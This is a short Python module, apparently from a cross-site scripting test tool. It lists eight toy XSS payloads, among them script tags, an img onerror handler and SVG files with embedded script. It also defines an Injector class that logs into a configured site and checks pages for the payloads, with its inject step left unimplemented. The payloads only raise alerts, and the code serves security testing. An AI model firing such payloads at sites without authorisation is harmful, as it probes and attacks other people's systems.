#!/usr/bin/env python3

import requests
from . import verify

PAYLOADS=[
    "<script>alert(\"naive-xss\")</script>",
    "<script src=\"naive-xss.js\"></script>",
    "<img src=\"fake.x\" onerror=\"alert('img-onerror-xss')\">",
    "<img src=\"xss.svg\">",
    "<svg width=\"100px\" height=\"100px\" viewBox=\"0 0 100 100\"\
         xmlns=\"http://www.w3.org/2000/svg\">\
      <script>\
        alert('direct-svg-xss')\
      </script>\
      <circle cx=\"50\" cy=\"50\" r=\"25\" fill=\"green\"/>\
    </svg>",
    "<embed src=\"xss.svg\" type=\"image/svg+xml\" />",
    "<iframe src=\"xss.svg\" width=\"0\" height=\"0\"></iframe>",
    "<object data=\"xss.svg\" type=\"image/svg+xml\"></object>"
]

class Injector(object):
    """Attemps to inject toy malicious payloads in website {domain}."""
    def __init__(self, config, payloads=PAYLOADS):
        super(Injector, self).__init__()
        self.domain     = config['domain']
        self.payloads   = payloads

        # paths for injections
        self.post_paths = config['post']

        # paths for checking injections -- must match in length
        # don't need to be different
        self.get_paths  = config['get']

        # creates the session
        self.session = Injector.authenticate(
                        self.domain,
                        config['auth']['path'],
                        config['auth']['creds']
                       )
    def run(self):
        self.inject()
        self.verify()

    def inject(self):
        pass

    def verify(self):
        verify.check(self.session, self.domain, self.get_paths, self.payloads)

    @staticmethod
    def authenticate(url, path, creds):
        session = requests.Session()
        session.post("{}/{}".format(url, path), data=creds)
        return session
